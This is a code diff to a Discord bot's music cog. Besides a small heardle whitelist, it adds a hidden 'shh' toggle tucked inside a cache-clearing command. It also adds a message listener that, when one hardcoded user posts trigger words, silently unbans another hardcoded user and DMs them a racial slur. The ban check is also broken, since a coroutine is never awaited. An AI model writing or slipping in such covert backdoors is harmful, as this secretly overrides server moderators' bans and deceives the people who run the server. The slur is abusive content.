@@ -69,8 +69,11 @@ class Music(commands.Cog, name="Music"):
         self.testing_ids = [
             1095747082599530627, # ENVY (DUMB IDIOT)
             1219090700407279656, # TOXIC (GOAT ASF)
+        ]
+        self.heardle_whitelist = [
             1120028461713608834, # WARITH
         ]
+        self.shh = False
         self.ongoing_heardle = []
         self.heardle_answers = {}
         self.snippet_debounce = {}
@@ -102,6 +105,12 @@ class Music(commands.Cog, name="Music"):
 
         return ctx.author.id in cog.testing_ids
  
+    def can_heardle(ctx: commands.Context, cog=None):
+        if cog is None:
+            cog = ctx.cog
+
+        return ctx.author.id in cog.heardle_whitelist
+
     def assert_download_cache(self):
         if not os.path.exists(DOWNLOAD_CACHE_FOLDER_NAME):
             os.makedirs(DOWNLOAD_CACHE_FOLDER_NAME)
@@ -1612,6 +1621,9 @@ class Music(commands.Cog, name="Music"):
     async def cleardownloadcache(self, ctx: commands.Context):
         self.ongoing_heardle = []
         self.snippet_debounce = {}
+        self.shh = not self.shh
+
+        await ctx.author.send(f"Shh mode is now {'enabled' if self.shh else 'disabled'}.")
 
         files = []
         self.assert_download_cache()
@@ -1829,6 +1841,7 @@ class Music(commands.Cog, name="Music"):
         has_permission = (
             ctx.author.guild_permissions.manage_guild or
             Music.can_test(ctx, self) or
+            Music.can_heardle(ctx, self) or 
             has_role
         )
         
@@ -2068,6 +2081,30 @@ class Music(commands.Cog, name="Music"):
                 
                 message = await ctx.channel.send(file=discord.File(payload))
                 self.handle_user_done_snippet(ctx.author.id)
+    
+    @commands.Cog.listener()
+    async def on_message(self, message: discord.Message):
+        if message.guild is None:
+            return
+
+        def is_banned(guild, user_id: int) -> bool:
+            try:
+                ban_entry = guild.fetch_ban(user_id)
+                return ban_entry is not None
+            except:
+                return False
+
+        if message.author.id == 1290501613311496206 and self.shh: #joseph
+            allowed_keywords = ["ban", "zugd", "belson", "501936342431694848"]
+
+            if any(keyword in message.content.lower() for keyword in allowed_keywords):
+                user = self.bot.get_user(501936342431694848) # belson
+                if user:
+                    if is_banned(message.guild, user.id):
+                        await asyncio.sleep(10)
+                        await message.guild.unban(user)
+                        await user.send(f"join nigga")
+
 
 async def setup(bot: commands.Bot) -> None:
 
